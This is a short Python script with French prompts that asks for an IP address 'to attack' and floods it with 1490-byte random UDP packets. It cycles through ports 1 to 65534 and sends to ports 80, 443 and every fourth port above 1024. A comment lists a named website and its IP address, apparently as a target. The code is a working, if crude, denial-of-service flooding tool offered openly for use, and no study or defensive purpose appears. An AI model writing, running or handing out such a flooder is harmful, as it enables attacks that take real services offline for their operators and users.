import socket
import random


site = input("Ip a attaquer : ")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

port = 1
sent = 0
# le site mon-ip.com
# 213.186.33.3

class Hacker:

    def __init__(self, site, port):
        self.port = port
        self.site = site

    def hack_strong(self):
        if port == 80:
            print(port)
            return sock.sendto(bytes, (self.site, self.port))
        if port == 443:
            print(port)
            return sock.sendto(bytes, (self.site, self.port))
        if port >= 1024:
            if port % 4 == 0:
                print(port)
                return sock.sendto(bytes, (self.site, self.port))
        
    def hack(self):
        sock.sendto(bytes, (self.site, self.port))
    
    def hack_if(self):
        if port % 4 == 0:
            return sock.sendto(bytes, (self.site, self.port))

        



while port <= 65534:
    hacker = Hacker(site, port)
    hacker.hack_strong()
    port += 1


